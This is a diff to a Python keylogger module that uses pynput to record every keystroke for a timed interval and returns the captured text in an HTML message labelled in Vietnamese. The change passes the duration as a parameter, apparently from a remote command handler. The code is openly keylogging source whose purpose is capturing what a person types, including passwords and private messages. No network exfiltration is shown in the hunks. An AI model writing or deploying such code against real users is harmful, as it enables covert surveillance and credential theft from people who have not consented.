@@ -1,7 +1,7 @@
 import time
 from pynput.keyboard import Listener, Key
 from .html_generator import HTML_Generator
-
+from threading import Thread
 key_log = ''
 listener = None
 
@@ -35,16 +35,15 @@ def listening_keyboard_stop():
         listener.stop()
         listener = None
 class KeyLogger:
-    def __init__(self,timer):
-        self.timer = timer
+    def __init__(self):
         pass
-    def __key_log(self):
+    def __key_log(self,timer):
         listening_keyboard_start()
-        countdown(self.timer,listening_keyboard_stop)
+        countdown(int(timer),listening_keyboard_stop)
         return key_log
-    def get_key_log(self):
+    def get_key_log(self,params):
         html = HTML_Generator.html_msg(
-            "Nội dung gõ phím trong "+str(self.timer)+" giây là: "+self.__key_log(),None,True)
+            "Nội dung gõ phím trong "+str(params[0])+" giây là: "+self.__key_log(params[0]),None,True)
         return {
             'html': html,
             'data': None
